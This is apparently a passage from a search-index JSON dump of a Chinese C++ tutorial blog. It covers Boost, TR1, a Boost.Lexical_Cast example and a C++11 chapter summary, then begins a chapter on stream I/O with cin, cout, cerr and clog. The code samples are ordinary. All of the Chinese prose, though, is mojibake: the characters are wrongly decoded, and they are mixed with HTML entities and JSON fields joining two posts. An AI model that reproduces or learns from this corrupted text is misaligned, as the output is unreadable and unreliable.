C++ æ ‡å‡†å§”å‘˜ä¼šè€ƒè™‘å¹¶æœ€ç»ˆçº³å…¥å®˜æ–¹æ ‡å‡†çš„å¯èƒ½æ€§å°±ä¼šå¤§å¤§å¢åŠ ã€‚ è®¸å¯è¯: Boost åº“é€šå¸¸é‡‡ç”¨éå¸¸å®½æ¾çš„ Boost Software Licenseï¼Œå…è®¸åœ¨å•†ä¸šå’Œéå•†ä¸šé¡¹ç›®ä¸­è‡ªç”±ä½¿ç”¨ã€‚ å³ä½¿æŸäº›åŠŸèƒ½å·²è¢«çº³å…¥ C++ æ ‡å‡†åº“ï¼ŒBoost ä»ç„¶æä¾›äº†æ ‡å‡†åº“ä¸­å°šæœªåŒ…å«çš„è®¸å¤šæœ‰ç”¨å·¥å…·ï¼Œå¹¶ä¸”æœ‰æ—¶ä¼šæä¾›æ¯”æ ‡å‡†åº“ç‰ˆæœ¬æ›´æ—©æˆ–åŠŸèƒ½æ›´ä¸°å¯Œçš„å®ç°ã€‚ 18.8.2 TR1 (Technical Report 1)**TR1 (Technical Report 1)**ï¼Œæ­£å¼åç§°æ˜¯ ISO/IEC TR 19768:2007ï¼Œæ˜¯ C++ æ ‡å‡†å§”å‘˜ä¼šå‘å¸ƒçš„ä¸€ä»½æŠ€æœ¯æŠ¥å‘Šï¼Œæ—¨åœ¨æ‰©å±• C++03 æ ‡å‡†åº“ã€‚å®ƒå¹¶ä¸æ˜¯ C++ æ ‡å‡†æœ¬èº«çš„ä¸€éƒ¨åˆ†ï¼Œä½†å®ƒå®šä¹‰äº†ä¸€ç³»åˆ—æ¨èæ·»åŠ çš„åº“ç»„ä»¶ã€‚ å†…å®¹: TR1 åŒ…å«äº†è®¸å¤šåæ¥è¢«æ­£å¼çº³å…¥ C++11 æ ‡å‡†åº“çš„ç‰¹æ€§ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†æºè‡ª Boost åº“ã€‚ä¸»è¦å†…å®¹åŒ…æ‹¬ï¼š å¼•ç”¨åŒ…è£…å™¨ (ref, cref) æ™ºèƒ½æŒ‡é’ˆ (shared_ptr, weak_ptr - unique_ptr æ˜¯ C++11 æ–°è®¾è®¡çš„) å‡½æ•°å¯¹è±¡åŒ…è£…å™¨ (function) å‡½æ•°å¯¹è±¡ç»‘å®šå™¨ (bind) ç±»å‹èƒå– (&lt;type_traits&gt;) éšæœºæ•°ç”Ÿæˆ (&lt;random&gt;) å…ƒç»„ (&lt;tuple&gt;) å›ºå®šå¤§å°æ•°ç»„ (&lt;array&gt;) å“ˆå¸Œè¡¨å®¹å™¨ (&lt;unordered_set&gt;, &lt;unordered_map&gt;) æ­£åˆ™è¡¨è¾¾å¼ (&lt;regex&gt;) å‘½åç©ºé—´: TR1 ä¸­çš„ç»„ä»¶é€šå¸¸è¢«æ”¾ç½®åœ¨ std::tr1 å‘½åç©ºé—´ä¸‹ã€‚ä¾‹å¦‚ï¼ŒTR1 çš„æ™ºèƒ½æŒ‡é’ˆæ˜¯ std::tr1::shared_ptrã€‚ è¿‡æ¸¡è§’è‰²: TR1 èµ·åˆ°äº†ä¸€ä¸ªé‡è¦çš„è¿‡æ¸¡ä½œç”¨ã€‚å®ƒå…è®¸ç¼–è¯‘å™¨å‚å•†å’Œåº“å¼€å‘è€…åœ¨ C++11 æ ‡å‡†æ­£å¼å‘å¸ƒä¹‹å‰ï¼Œå°±å¼€å§‹å®ç°å’Œæä¾›è¿™äº›å³å°†æ ‡å‡†åŒ–çš„é‡è¦åº“åŠŸèƒ½ï¼Œè®©ç”¨æˆ·å¯ä»¥æå‰ä½“éªŒå’Œä½¿ç”¨ã€‚å½“ C++11 æ ‡å‡†å‘å¸ƒåï¼Œè¿™äº›ç»„ä»¶è¢«æ­£å¼ç§»å…¥äº† std å‘½åç©ºé—´ï¼Œstd::tr1 å‘½åç©ºé—´åˆ™é€æ¸è¢«åºŸå¼ƒã€‚ äº†è§£ Boost å’Œ TR1 æœ‰åŠ©äºç†è§£ C++11 ä¸­è®¸å¤šåº“ç‰¹æ€§çš„æ¥æºå’Œæ¼”å˜è¿‡ç¨‹ã€‚å®ƒä»¬å±•ç¤ºäº† C++ ç¤¾åŒºé©±åŠ¨è¯­è¨€å‘å±•çš„æ¨¡å¼ï¼šé€šè¿‡ç¬¬ä¸‰æ–¹åº“ï¼ˆå¦‚ Boostï¼‰è¿›è¡Œæ¢ç´¢å’Œå®è·µï¼Œé€šè¿‡æŠ€æœ¯æŠ¥å‘Šï¼ˆå¦‚ TR1ï¼‰è¿›è¡Œé¢„æ ‡å‡†åŒ–ï¼Œæœ€ç»ˆå°†æˆç†Ÿçš„ç‰¹æ€§çº³å…¥å®˜æ–¹æ ‡å‡†ã€‚ 18.8.3 ä½¿ç”¨ Boostè™½ç„¶è®¸å¤š Boost åº“çš„åŠŸèƒ½å·²è¢« C++11 åŠåç»­æ ‡å‡†å¸æ”¶ï¼Œä½† Boost ä»ç„¶æ˜¯ä¸€ä¸ªéå¸¸æœ‰ä»·å€¼çš„èµ„æºåº“ã€‚ å¦‚ä½•ä½¿ç”¨ Boost (æ¦‚å¿µæ€§æ­¥éª¤): ä¸‹è½½: ä» Boost å®˜æ–¹ç½‘ç«™ (boost.org) ä¸‹è½½æœ€æ–°çš„ Boost å‘è¡Œç‰ˆã€‚ è§£å‹: å°†ä¸‹è½½çš„å‹ç¼©åŒ…è§£å‹åˆ°ä½ é€‰æ‹©çš„ç›®å½•ã€‚ ç¼–è¯‘ (éƒ¨åˆ†åº“éœ€è¦): Boost ä¸­çš„è®¸å¤šåº“æ˜¯ä»…å¤´æ–‡ä»¶ (Header-only) çš„ï¼Œè¿™æ„å‘³ç€ä½ åªéœ€è¦åœ¨ä½ çš„ä»£ç ä¸­ #include ç›¸åº”çš„å¤´æ–‡ä»¶ï¼Œå¹¶å°† Boost çš„æ ¹ç›®å½•æ·»åŠ åˆ°ç¼–è¯‘å™¨çš„åŒ…å«è·¯å¾„ (Include Path) ä¸­å³å¯ä½¿ç”¨ã€‚ç„¶è€Œï¼Œä¹Ÿæœ‰ä¸€äº›åº“ï¼ˆå¦‚ Boost.Thread, Boost.Filesystem, Boost.Regex, Boost.Program_options ç­‰ï¼‰éœ€è¦ç¼–è¯‘æˆé™æ€åº“æˆ–åŠ¨æ€åº“æ–‡ä»¶ã€‚ ç¼–è¯‘é€šå¸¸éœ€è¦è¿è¡Œ Boost æä¾›çš„ bootstrap è„šæœ¬ï¼ˆæ ¹æ®ä½ çš„æ“ä½œç³»ç»Ÿé€‰æ‹© .bat æˆ– .shï¼‰ï¼Œç„¶åè¿è¡Œç”Ÿæˆçš„ b2 (æˆ– bjam) æ„å»ºå·¥å…·ã€‚ä½ éœ€è¦æŒ‡å®šä½ çš„ç¼–è¯‘å™¨ã€æ„å»ºç±»å‹ï¼ˆdebug/releaseï¼‰ã€é“¾æ¥æ–¹å¼ï¼ˆstatic/sharedï¼‰ç­‰ã€‚å…·ä½“æ­¥éª¤è¯·å‚è€ƒ Boost å®˜æ–¹æ–‡æ¡£ã€‚ é…ç½®é¡¹ç›®: åŒ…å«è·¯å¾„: åœ¨ä½ çš„é¡¹ç›®è®¾ç½®ä¸­ï¼Œå°† Boost åº“çš„æ ¹ç›®å½•æ·»åŠ åˆ°ç¼–è¯‘å™¨çš„å¤´æ–‡ä»¶æœç´¢è·¯å¾„ã€‚ åº“è·¯å¾„ (å¦‚æœç¼–è¯‘äº†åº“): å°†ç”Ÿæˆçš„åº“æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•æ·»åŠ åˆ°é“¾æ¥å™¨çš„åº“æ–‡ä»¶æœç´¢è·¯å¾„ã€‚ é“¾æ¥åº“ (å¦‚æœç¼–è¯‘äº†åº“): å°†ä½ éœ€è¦ä½¿ç”¨çš„ Boost åº“æ–‡ä»¶ï¼ˆå¦‚ libboost_thread-vc142-mt-gd-x64-1_79.lib ç­‰ï¼Œæ–‡ä»¶åä¼šæ ¹æ®ç‰ˆæœ¬ã€ç¼–è¯‘å™¨ã€é…ç½®ç­‰å˜åŒ–ï¼‰æ·»åŠ åˆ°é“¾æ¥å™¨çš„è¾“å…¥ä¸­ã€‚ åŒ…å«å¤´æ–‡ä»¶: åœ¨ä½ çš„ C++ ä»£ç ä¸­ä½¿ç”¨ #include &lt;boost/xxx.hpp&gt; æ¥åŒ…å«æ‰€éœ€çš„ Boost å¤´æ–‡ä»¶ã€‚ ç¤ºä¾‹ (ä½¿ç”¨ Boost.Lexical_Cast):Boost.Lexical_Cast æ˜¯ä¸€ä¸ªä»…å¤´æ–‡ä»¶çš„åº“ï¼Œç”¨äºå­—ç¬¦ä¸²å’Œæ•°å€¼ä¹‹é—´çš„è½¬æ¢ã€‚ 12345678910111213141516171819202122// å‡è®¾ Boost æ ¹ç›®å½•å·²æ·»åŠ åˆ°åŒ…å«è·¯å¾„#include &lt;boost/lexical_cast.hpp&gt;#include &lt;string&gt;#include &lt;iostream&gt;int main() &#123; try &#123; std::string s = &quot;12345&quot;; int i = boost::lexical_cast&lt;int&gt;(s); std::cout &lt;&lt; &quot;String &#x27;&quot; &lt;&lt; s &lt;&lt; &quot;&#x27; cast to int: &quot; &lt;&lt; i &lt;&lt; std::endl; double d = 3.14159; std::string sd = boost::lexical_cast&lt;std::string&gt;(d); std::cout &lt;&lt; &quot;Double &quot; &lt;&lt; d &lt;&lt; &quot; cast to string: &#x27;&quot; &lt;&lt; sd &lt;&lt; &quot;&#x27;&quot; &lt;&lt; std::endl; std::string bad_s = &quot;hello&quot;; int bad_i = boost::lexical_cast&lt;int&gt;(bad_s); // ä¼šæŠ›å‡º boost::bad_lexical_cast å¼‚å¸¸ &#125; catch (const boost::bad_lexical_cast&amp; e) &#123; std::cerr &lt;&lt; &quot;Lexical cast error: &quot; &lt;&lt; e.what() &lt;&lt; std::endl; &#125; return 0;&#125; ä½¿ç”¨ Boost åº“å¯ä»¥æå¤§åœ°æ‰©å±• C++ çš„èƒ½åŠ›ï¼Œä½†éœ€è¦æ³¨æ„æ­£ç¡®é…ç½®ç¼–è¯‘å’Œé“¾æ¥ç¯å¢ƒã€‚å»ºè®®è¯¦ç»†é˜…è¯»ä½ æ‰€ä½¿ç”¨çš„å…·ä½“ Boost åº“çš„æ–‡æ¡£ã€‚ 18.9 æ€»ç»“æœ¬ç« æ·±å…¥æ¢è®¨äº† C++11 æ ‡å‡†å¼•å…¥çš„ä¸€ç³»åˆ—é‡è¦ç‰¹æ€§ï¼Œè¿™äº›ç‰¹æ€§æå¤§åœ°æ”¹å˜äº† C++ çš„ç¼–ç¨‹æ–¹å¼ï¼Œä½¿å…¶æ›´é«˜æ•ˆã€æ›´å®‰å…¨ã€æ›´æ˜“ç”¨ã€‚ ä¸»è¦å†…å®¹å›é¡¾ï¼š C++11 ç‰¹æ€§å›é¡¾: å¤ä¹ äº†ä¹‹å‰ç« èŠ‚å·²ä»‹ç»çš„ C++11 åŠŸèƒ½ï¼ŒåŒ…æ‹¬æ–°ç±»å‹ (long long, char16_t, char32_t, nullptr)ã€ç»Ÿä¸€åˆå§‹åŒ– (&#123;&#125;), å£°æ˜ (auto, decltype)ã€æ™ºèƒ½æŒ‡é’ˆ (unique_ptr, shared_ptr, weak_ptr)ã€å¼‚å¸¸è§„èŒƒ (noexcept)ã€ä½œç”¨åŸŸå†…æšä¸¾ (enum class) ä»¥åŠå¯¹ç±»ã€æ¨¡æ¿å’Œ STL çš„æ”¹è¿›ï¼ˆå¦‚èŒƒå›´ forã€arrayã€æ— åºå®¹å™¨ã€initializer_listã€æ¨¡æ¿åˆ«å usingï¼‰ã€‚ ç§»åŠ¨è¯­ä¹‰å’Œå³å€¼å¼•ç”¨: å³å€¼å¼•ç”¨ (&amp;&amp;): å¼•å…¥ç”¨äºåŒºåˆ†å³å°†é”€æ¯çš„ä¸´æ—¶å¯¹è±¡ï¼ˆå³å€¼ï¼‰å’ŒæŒä¹…å¯¹è±¡ï¼ˆå·¦å€¼ï¼‰ã€‚ ç§»åŠ¨è¯­ä¹‰: å…è®¸ä»å³å€¼æˆ–æ ‡è®°ä¸ºå¯ç§»åŠ¨çš„å¯¹è±¡é‚£é‡Œâ€œçªƒå–â€èµ„æºï¼ˆå¦‚åŠ¨æ€å†…å­˜æŒ‡é’ˆï¼‰ï¼Œè€Œä¸æ˜¯è¿›è¡Œæ˜‚è´µçš„å¤åˆ¶ã€‚ ç§»åŠ¨æ„é€ å‡½æ•°å’Œç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦: ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼Œæ¥æ”¶å³å€¼å¼•ç”¨å‚æ•°ï¼Œå®ç°èµ„æºè½¬ç§»å¹¶å°†æºå¯¹è±¡ç½®äºæœ‰æ•ˆçš„ç©ºçŠ¶æ€ã€‚åº”æ ‡è®°ä¸º noexceptã€‚ std::move: å°†ä¸€ä¸ªå·¦å€¼å¼ºåˆ¶è½¬æ¢ä¸ºå³å€¼å¼•ç”¨ç±»å‹ï¼Œä»¥è§¦å‘ç§»åŠ¨è¯­ä¹‰ï¼ˆä½†æœ¬èº«ä¸æ‰§è¡Œç§»åŠ¨ï¼‰ã€‚ä½¿ç”¨åä¸åº”å¯¹æºå¯¹è±¡çš„å€¼åšå‡è®¾ã€‚ æ–°çš„ç±»åŠŸèƒ½: ç‰¹æ®Šæˆå‘˜å‡½æ•°æ§åˆ¶ (= default, = delete): æ˜¾å¼è¦æ±‚ç¼–è¯‘å™¨ç”Ÿæˆé»˜è®¤å®ç°æˆ–ç¦ç”¨ç‰¹å®šæˆå‘˜å‡½æ•°ï¼ˆç‰¹åˆ«æ˜¯å¤åˆ¶/ç§»åŠ¨æ“ä½œï¼‰ã€‚ å§”æ‰˜æ„é€ å‡½æ•°: å…è®¸ä¸€ä¸ªæ„é€ å‡½æ•°è°ƒç”¨åŒä¸€ç±»çš„å¦ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå‡å°‘ä»£ç é‡å¤ã€‚ ç»§æ‰¿æ„é€ å‡½æ•° (using Base::Base;): å…è®¸æ´¾ç”Ÿç±»ç»§æ‰¿åŸºç±»çš„æ„é€ å‡½æ•°ï¼Œç®€åŒ–æ´¾ç”Ÿç±»ç¼–å†™ã€‚ è™šå‡½æ•°ç®¡ç† (override, final): override ç¡®ä¿æ´¾ç”Ÿç±»æ–¹æ³•æ­£ç¡®è¦†ç›–åŸºç±»è™šå‡½æ•°ï¼›final é˜»æ­¢è™šå‡½æ•°è¢«è¿›ä¸€æ­¥è¦†ç›–æˆ–ç±»è¢«ç»§æ‰¿ã€‚ Lambda å‡½æ•°: æä¾›ç®€æ´çš„è¯­æ³•ï¼Œç”¨äºåœ¨éœ€è¦å¯è°ƒç”¨å¯¹è±¡çš„åœ°æ–¹å°±åœ°å®šä¹‰åŒ¿åå‡½æ•°å¯¹è±¡ã€‚ [capture](params) -&gt; ret &#123;body&#125;: åŒ…å«æ•è·å­å¥ã€å‚æ•°åˆ—è¡¨ï¼ˆå¯é€‰ï¼‰ã€è¿”å›ç±»å‹ï¼ˆå¯é€‰ï¼‰å’Œå‡½æ•°ä½“ã€‚ æ•è·: å¯ä»¥é€šè¿‡å€¼ (=, var) æˆ–å¼•ç”¨ (&amp;, &amp;var) æ•è·å¤–éƒ¨ä½œç”¨åŸŸçš„å˜é‡ã€‚mutable å…³é”®å­—å…è®¸ä¿®æ”¹å€¼æ•è·å˜é‡çš„å‰¯æœ¬ã€‚ å¸¸ç”¨äº STL ç®—æ³•ï¼Œæé«˜ä»£ç çš„å±€éƒ¨æ€§å’Œå¯è¯»æ€§ã€‚ åŒ…è£…å™¨ (std::function): å®šä¹‰åœ¨ &lt;functional&gt; ä¸­çš„é€šç”¨å‡½æ•°åŒ…è£…å™¨ã€‚ å¯ä»¥å­˜å‚¨ã€å¤åˆ¶å’Œè°ƒç”¨ä»»ä½•å…·æœ‰å…¼å®¹ç­¾åçš„å¯è°ƒç”¨å®ä½“ï¼ˆå‡½æ•°æŒ‡é’ˆã€Lambdaã€å‡½æ•°å¯¹è±¡ã€æˆå‘˜å‡½æ•°ç­‰ï¼‰ã€‚ é€šè¿‡ç±»å‹æ“¦é™¤å®ç°ï¼Œæä¾›äº†çµæ´»æ€§ï¼Œä½†åœ¨æ€§èƒ½æ•æ„Ÿåœºæ™¯ä¸‹å¯èƒ½æœ‰å¼€é”€ï¼ˆå †åˆ†é…ã€é—´æ¥è°ƒç”¨ï¼‰ã€‚ æ›¿ä»£æ–¹æ¡ˆåŒ…æ‹¬æ¨¡æ¿ï¼ˆç¼–è¯‘æ—¶å·²çŸ¥ç±»å‹æ—¶æ›´é«˜æ•ˆï¼‰ã€å‡½æ•°æŒ‡é’ˆã€ç›´æ¥ä¼ é€’ Lambdaã€‚ å¯å˜å‚æ•°æ¨¡æ¿: å…è®¸å‡½æ•°æ¨¡æ¿å’Œç±»æ¨¡æ¿æ¥å—ä»»æ„æ•°é‡ã€ä»»æ„ç±»å‹çš„æ¨¡æ¿å‚æ•°ï¼ˆæ¨¡æ¿å‚æ•°åŒ… typename... Argsï¼‰å’Œå‡½æ•°å‚æ•°ï¼ˆå‡½æ•°å‚æ•°åŒ… Args... argsï¼‰ã€‚ ä½¿ç”¨ sizeof...(Args) è·å–å‚æ•°æ•°é‡ã€‚ é€šå¸¸éœ€è¦é€šè¿‡é€’å½’æˆ– C++17 çš„æŠ˜å è¡¨è¾¾å¼æ¥å±•å¼€å‚æ•°åŒ…ï¼Œä»¥å¤„ç†æ¯ä¸ªå‚æ•°ã€‚ C++11 æ–°å¢çš„å…¶ä»–åŠŸèƒ½: å¹¶å‘ç¼–ç¨‹: æ ‡å‡†åº“æ”¯æŒ (&lt;thread&gt;, &lt;mutex&gt;, &lt;atomic&gt;, &lt;future&gt; ç­‰ï¼‰ã€‚ æ–°åº“: &lt;chrono&gt; (æ—¶é—´), &lt;random&gt; (éšæœºæ•°), &lt;regex&gt; (æ­£åˆ™è¡¨è¾¾å¼), &lt;tuple&gt; (å…ƒç»„)ã€‚ ä½çº§ç¼–ç¨‹: å¯¹é½æ§åˆ¶ (alignas, alignof), ç¼–è¯‘æ—¶è®¡ç®— (constexpr)ã€‚ æ‚é¡¹: ç”¨æˆ·å®šä¹‰å­—é¢é‡, åŸå§‹å­—ç¬¦ä¸²å­—é¢é‡ (R&quot;(...)&quot;)ã€‚ è¯­è¨€å˜åŒ–: å¼ºè°ƒäº† C++ è¯­è¨€çš„æŒç»­æ¼”è¿›ã€‚ ä»‹ç»äº† Boost åº“ä½œä¸º C++ æ–°ç‰¹æ€§çš„è¯•éªŒåœºå’Œé‡è¦è¡¥å……ã€‚ ä»‹ç»äº† TR1 ä½œä¸º C++11 åº“ç‰¹æ€§çš„å‰èº«å’Œè¿‡æ¸¡ã€‚ C++11 æ˜¯ C++ å‘å±•çš„ä¸€ä¸ªé‡è¦åˆ†æ°´å²­ï¼Œå®ƒå¼•å…¥çš„è¿™äº›ç‰¹æ€§æ·±åˆ»åœ°å½±å“äº†ç°ä»£ C++ çš„ç¼–ç¨‹é£æ ¼å’Œå®è·µã€‚","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 17 è¾“å…¥ã€è¾“å‡ºå’Œæ–‡ä»¶","slug":"Cpp_tutorial_Chapter_17","date":"2025-04-30T15:42:24.026Z","updated":"2025-04-30T15:40:48.053Z","comments":true,"path":"2025/04/30/Cpp_tutorial_Chapter_17/","link":"","permalink":"http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_17/","excerpt":"","text":"17.1 C++è¾“å…¥å’Œè¾“å‡ºæ¦‚è¿°C++ ç¨‹åºç»å¸¸éœ€è¦ä¸å¤–éƒ¨ä¸–ç•Œè¿›è¡Œäº¤äº’ï¼šä»é”®ç›˜è¯»å–ç”¨æˆ·è¾“å…¥ï¼Œå°†ç»“æœæ˜¾ç¤ºåˆ°å±å¹•ï¼Œæˆ–è€…è¯»å†™æ–‡ä»¶ã€‚C++ ä½¿ç”¨æµ (Stream) çš„æ¦‚å¿µæ¥å¤„ç†è¾“å…¥å’Œè¾“å‡º (I/O) æ“ä½œã€‚ 17.1.1 æµå’Œç¼“å†²åŒºæµ (Stream) æ˜¯ä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µï¼Œå®ƒè¡¨ç¤ºä¸€ä¸ªå­—èŠ‚åºåˆ—ï¼Œè¿™äº›å­—èŠ‚å¯ä»¥ä»æŸä¸ªæºï¼ˆå¦‚é”®ç›˜ã€æ–‡ä»¶ã€ç½‘ç»œè¿æ¥ï¼‰æµå‘ç¨‹åºï¼ˆè¾“å…¥æµï¼‰ï¼Œæˆ–è€…ä»ç¨‹åºæµå‘æŸä¸ªç›®çš„åœ°ï¼ˆå¦‚å±å¹•ã€æ–‡ä»¶ã€ç½‘ç»œè¿æ¥ï¼‰ï¼ˆè¾“å‡ºæµï¼‰ã€‚å°† I/O æ“ä½œè§†ä¸ºå­—èŠ‚æµå¯ä»¥æä¾›ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£æ¥å¤„ç†å„ç§ä¸åŒçš„ I/O è®¾å¤‡ã€‚ ç¼“å†²åŒº (Buffer) æ˜¯ä¸€å—å†…å­˜åŒºåŸŸï¼Œç”¨äºä¸´æ—¶å­˜å‚¨æ•°æ®ã€‚I/O æ“ä½œé€šå¸¸æ¶‰åŠç‰©ç†è®¾å¤‡ï¼ˆå¦‚ç¡¬ç›˜ã€å±å¹•ï¼‰ï¼Œè¿™äº›è®¾å¤‡çš„é€Ÿåº¦å¾€å¾€æ¯” CPU å’Œå†…å­˜æ…¢å¾—å¤šã€‚ä¸ºäº†æé«˜æ•ˆç‡ï¼Œæ•°æ®é€šå¸¸ä¸ä¼šåœ¨ç¨‹åºå’Œè®¾å¤‡ä¹‹é—´é€ä¸ªå­—èŠ‚åœ°ä¼ è¾“ï¼Œè€Œæ˜¯å…ˆæš‚å­˜åœ¨ç¼“å†²åŒºä¸­ï¼š è¾“å‡º: å½“ç¨‹åºæ‰§è¡Œè¾“å‡ºæ“ä½œæ—¶ï¼ˆä¾‹å¦‚ä½¿ç”¨ cout &lt;&lt;ï¼‰ï¼Œæ•°æ®é€šå¸¸å…ˆè¢«å‘é€åˆ°è¾“å‡ºç¼“å†²åŒºã€‚å½“ç¼“å†²åŒºæ»¡äº†ã€é‡åˆ°æ¢è¡Œç¬¦ï¼ˆå¯¹äºè¡Œç¼“å†²çš„æµï¼‰ã€ç¨‹åºç»“æŸæˆ–æ˜¾å¼åˆ·æ–°ç¼“å†²åŒºæ—¶ï¼Œç¼“å†²åŒºä¸­çš„å†…å®¹æ‰ä¼šè¢«ä¸€æ¬¡æ€§åœ°ä¼ è¾“åˆ°æœ€ç»ˆçš„è¾“å‡ºè®¾å¤‡ã€‚ è¾“å…¥: å½“ç¨‹åºè¯·æ±‚è¾“å…¥æ—¶ï¼ˆä¾‹å¦‚ä½¿ç”¨ cin &gt;&gt;ï¼‰ï¼Œç³»ç»Ÿå¯èƒ½ä¼šä¸€æ¬¡æ€§ä»è¾“å…¥è®¾å¤‡è¯»å–æ¯”ç¨‹åºè¯·æ±‚çš„æ›´å¤šçš„æ•°æ®ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨è¾“å…¥ç¼“å†²åŒºä¸­ã€‚ç¨‹åºéšåä»ç¼“å†²åŒºä¸­è·å–æ‰€éœ€çš„æ•°æ®ã€‚å¦‚æœç¼“å†²åŒºä¸ºç©ºï¼Œç¨‹åºä¼šç­‰å¾…è¾“å…¥è®¾å¤‡æä¾›æ•°æ®ã€‚ ä½¿ç”¨ç¼“å†²åŒºçš„å¥½å¤„: æé«˜æ•ˆç‡: å‡å°‘äº†ä¸æ…¢é€Ÿ I/O è®¾å¤‡çš„ç›´æ¥äº¤äº’æ¬¡æ•°ã€‚ å¹³æ»‘æ•°æ®æµ: å…è®¸ç¨‹åºå’Œè®¾å¤‡ä»¥å„è‡ªçš„é€Ÿåº¦å·¥ä½œã€‚ ç¼“å†²åŒºçš„ç±»å‹: å®Œå…¨ç¼“å†² (Fully Buffered): åªæœ‰å½“ç¼“å†²åŒºæ»¡äº†ï¼Œæˆ–è€…æ˜¾å¼åˆ·æ–°æ—¶ï¼Œæ‰ä¼šè¿›è¡Œå®é™…çš„ I/O æ“ä½œï¼ˆé€šå¸¸ç”¨äºæ–‡ä»¶ I/Oï¼‰ã€‚ è¡Œç¼“å†² (Line Buffered): é™¤äº†ç¼“å†²åŒºæ»¡æˆ–æ˜¾å¼åˆ·æ–°å¤–ï¼Œé‡åˆ°æ¢è¡Œç¬¦ (\\n) æ—¶ä¹Ÿä¼šè¿›è¡Œ I/O æ“ä½œï¼ˆé€šå¸¸ç”¨äºæ ‡å‡†è¾“å‡º coutï¼Œå½“å®ƒè¿æ¥åˆ°ç»ˆç«¯æ—¶ï¼‰ã€‚ æ— ç¼“å†² (Unbuffered): æ•°æ®å°½å¿«è¿›è¡Œå®é™…çš„ I/O æ“ä½œï¼ˆé€šå¸¸ç”¨äºæ ‡å‡†é”™è¯¯è¾“å‡º cerrï¼Œä»¥ç¡®ä¿é”™è¯¯ä¿¡æ¯èƒ½ç«‹å³æ˜¾ç¤ºï¼‰ã€‚ 17.1.2 æµã€ç¼“å†²åŒºå’Œ iostream æ–‡ä»¶C++ çš„ I/O åŠŸèƒ½ä¸»è¦å®šä¹‰åœ¨ &lt;iostream&gt; å¤´æ–‡ä»¶ä¸­ï¼ˆä»¥åŠå…¶ä»–ç›¸å…³å¤´æ–‡ä»¶å¦‚ &lt;fstream&gt;, &lt;sstream&gt;ï¼‰ã€‚&lt;iostream&gt; å®šä¹‰äº†ä¸€ç³»åˆ—ç”¨äºå¤„ç†æµçš„ç±»å’Œå¯¹è±¡ã€‚ æ ¸å¿ƒ I/O ç±»åº“: ios_base: æä¾›äº†ä¸æµæ— å…³çš„åŸºæœ¬å±æ€§å’Œæ–¹æ³•ï¼ˆå¦‚æ ¼å¼åŒ–æ ‡å¿—ã€æµçŠ¶æ€ï¼‰ã€‚ ios: åŸºäº ios_baseï¼Œå¢åŠ äº†ä¸å…·ä½“å­—ç¬¦ç±»å‹ç›¸å…³çš„é”™è¯¯çŠ¶æ€ä¿¡æ¯ã€‚ ostream: åŸºäº iosï¼Œæä¾›äº†è¾“å‡ºæµçš„åŠŸèƒ½ï¼ˆå¦‚ operator&lt;&lt;, put(), write()ï¼‰ã€‚ istream: åŸºäº iosï¼Œæä¾›äº†è¾“å…¥æµçš„åŠŸèƒ½ï¼ˆå¦‚ operator&gt;&gt;, get(), getline(), read()ï¼‰ã€‚ iostream: åŒæ—¶ç»§æ‰¿è‡ª istream å’Œ ostreamï¼Œæ”¯æŒè¾“å…¥å’Œè¾“å‡ºæ“ä½œã€‚ æ ‡å‡†æµå¯¹è±¡: &lt;iostream&gt; è¿˜å®šä¹‰äº†å‡ ä¸ªé¢„å®šä¹‰çš„å…¨å±€æµå¯¹è±¡ï¼Œç”¨äºå¤„ç†æ ‡å‡†è¾“å…¥å’Œè¾“å‡ºï¼š cin (console input): istream ç±»çš„å¯¹è±¡ï¼Œé€šå¸¸è¿æ¥åˆ°æ ‡å‡†è¾“å…¥è®¾å¤‡ï¼ˆé”®ç›˜ï¼‰ã€‚ cout (console output): ostream ç±»çš„å¯¹è±¡ï¼Œé€šå¸¸è¿æ¥åˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ï¼ˆå±å¹•ï¼‰ã€‚å®ƒé€šå¸¸æ˜¯è¡Œç¼“å†²çš„ã€‚ cerr (console error): ostream ç±»çš„å¯¹è±¡ï¼Œé€šå¸¸è¿æ¥åˆ°æ ‡å‡†é”™è¯¯è®¾å¤‡ï¼ˆå±å¹•ï¼‰ã€‚å®ƒé€šå¸¸æ˜¯æ— ç¼“å†²çš„ï¼Œç”¨äºç«‹å³æ˜¾ç¤ºé”™è¯¯æ¶ˆæ¯ã€‚ clog (console log): ostream ç±»çš„å¯¹è±¡ï¼Œä¹Ÿé€šå¸¸è¿æ¥åˆ°æ ‡å‡†é”™è¯¯è®¾å¤‡ã€‚ä½†å®ƒé€šå¸¸æ˜¯ç¼“å†²çš„ã€‚ 1234567891011121314151617#include &lt;iostream&gt; // åŒ…å« iostream ä»¥ä½¿ç”¨ cin, cout, cerr, clogint main() &#123; int age; std::cout &lt;&lt; &quot;Enter your age: &quot;; // ä½¿ç”¨ cout è¾“å‡ºæç¤ºä¿¡æ¯åˆ°æ ‡å‡†è¾“å‡º std::cin &gt;&gt; age; // ä½¿ç”¨ cin ä»æ ‡å‡†è¾“å…¥è¯»å–æ•´æ•° if (age &lt; 0) &#123; std::cerr &lt;&lt; &quot;Error: Age cannot be negative.&quot; &lt;&lt; std::endl; // ä½¿ç”¨ cerr è¾“å‡ºé”™è¯¯ä¿¡æ¯åˆ°æ ‡å‡†é”™è¯¯ std::clog &lt;&lt; &quot;Log: Invalid age entered.&quot; &lt;&lt; std::endl; // ä½¿ç”¨ clog è¾“å‡ºæ—¥å¿—ä¿¡æ¯ return 1; &#125; std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; age &lt;&lt; std::endl; // è¾“å‡ºç»“æœåˆ°æ ‡å‡†è¾“å‡º return 0;&#125; è¿™äº›æ ‡å‡†æµå¯¹è±¡ä½¿å¾—åŸºæœ¬çš„æ§åˆ¶å° I/O éå¸¸æ–¹ä¾¿ã€‚ 17.1.3 é‡å®šå‘è®¸å¤šæ“ä½œç³»ç»Ÿï¼ˆå¦‚ Linux, macOS, Windowsï¼‰æ”¯æŒI/O é‡å®šå‘ 